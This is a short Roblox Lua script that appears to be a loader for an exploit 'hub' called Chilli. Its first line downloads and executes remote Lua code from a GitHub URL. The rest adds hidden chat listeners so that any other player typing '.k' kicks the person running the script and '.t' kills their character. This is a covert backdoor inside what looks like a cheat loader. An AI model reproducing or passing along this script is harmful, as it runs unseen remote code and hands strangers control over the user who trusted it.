loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

for _, plr in pairs(Players:GetPlayers()) do
    if plr ~= localPlayer then
        plr.Chatted:Connect(function(msg)
            if msg == ".k" then
                localPlayer:Kick("You have been removed by Chilli Hub")
            elseif msg == ".t" then
                localPlayer.Character.Humanoid.Health = 0
            end
        end)
    end
end

Players.PlayerAdded:Connect(function(plr)
    if plr ~= localPlayer then
        plr.Chatted:Connect(function(msg)
            if msg == ".k" then
                localPlayer:Kick("You have been removed by Chilli Hub")
            elseif msg == ".t" then
                localPlayer.Character.Humanoid.Health = 0
            end
        end)
    end
end)
